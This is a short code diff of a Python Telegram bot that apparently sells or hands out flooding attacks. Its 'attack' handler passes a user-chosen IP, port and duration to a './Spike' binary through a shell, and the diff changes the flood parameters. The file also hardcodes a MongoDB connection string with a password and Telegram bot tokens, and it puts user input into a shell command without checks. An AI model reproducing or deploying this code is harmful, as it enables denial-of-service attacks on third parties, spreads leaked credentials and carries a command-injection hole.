@@ -20,13 +20,13 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 # Database Configuration
 MONGO_URI = 'mongodb+srv://harry:Sachdeva@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
 client = MongoClient(MONGO_URI)
-db = client['Venture']
+db = client['Testing']
 users_collection = db['shalu']
 settings_collection = db['settings']
 redeem_codes_collection = db['redeem_code-Harveyy']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7794130580:AAFppGVaFjofH6aZRaSOoVnerEefoBTPuVk'
+TELEGRAM_BOT_TOKEN = '7542906508:AAGY0M6HoSRqz-g1FStvxe5aLa7wTaIXkdw'
 ADMIN_USER_ID = 5134043595
 
 # Cooldown dictionary and user attack history
@@ -210,7 +210,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 1024 400",
+            f"./Spike {ip} {port} {duration} 6 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
